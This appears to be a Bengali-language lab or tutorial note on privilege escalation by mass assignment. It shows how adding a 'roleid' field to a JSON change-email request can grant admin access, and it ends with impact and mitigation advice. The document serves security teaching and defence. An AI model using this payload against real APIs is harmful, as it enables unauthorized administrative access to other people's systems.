# Privilege Escalation

## উদ্দেশ্য

যদি API Request-এর JSON Body-তে অতিরিক্ত Parameter গ্রহণ করা হয় এবং Server সেগুলো যাচাই ছাড়াই Update করে, তাহলে User নিজের Role পরিবর্তন করে Admin Privilege নিতে পারে।

---

## পূর্বশর্ত

- API JSON Input গ্রহণ করে।
- Sensitive Field (যেমন `roleid`) Server-side Filter করা হয় না।
- Server Client-এর পাঠানো Field Trust করে।

---

## আক্রমণের ধাপ

### ১. Profile Update Request ধরুন

Email Update করার Request Burp Repeater-এ পাঠান।

উদাহরণ:

```
POST /my-account/change-email
Content-Type: application/json

{
  "email":"user@example.com"
}
```

---

### ২. অতিরিক্ত Field যোগ করুন

Request Body পরিবর্তন করুন।

```
POST /my-account/change-email
Content-Type: application/json

{
  "email":"user@example.com",
  "roleid":2
}
```

Request পাঠান।

---

### ৩. Admin Panel Access করুন

যদি Server `roleid` Update করে, তাহলে

```
GET /admin
```

Access পাওয়া যাবে।

---

## কেন এটি কাজ করে

Server শুধুমাত্র অনুমোদিত Field Update করার পরিবর্তে Client-এর পাঠানো সব Field Database-এ সংরক্ষণ করে। ফলে `roleid`-এর মতো Sensitive Attribute পরিবর্তন করা সম্ভব হয়।

---

## Impact

- Privilege Escalation
- Unauthorized Admin Access
- Full Account Compromise

---

## Mitigation

- Mass Assignment Protection ব্যবহার করতে হবে।
- শুধুমাত্র Allowlist করা Field Update করতে হবে।
- `roleid`, `isAdmin` ইত্যাদি Sensitive Field Client থেকে গ্রহণ করা যাবে না।
- প্রতিটি Role পরিবর্তনের আগে Server-side Authorization Check করতে হবে।
